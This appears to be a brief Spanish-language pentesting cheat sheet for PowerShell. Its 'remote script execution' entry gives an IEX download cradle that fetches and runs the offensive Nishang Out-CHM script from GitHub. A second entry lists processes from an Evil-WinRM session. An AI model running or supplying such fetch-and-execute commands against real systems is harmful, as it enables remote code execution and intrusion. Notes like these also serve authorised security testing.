# Powershell

## Ejecución de scripts remotos

```null
IEX(New-Object Net.WebClient).downloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1")
```

## Listar procesos

```null
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> Get-Process
```

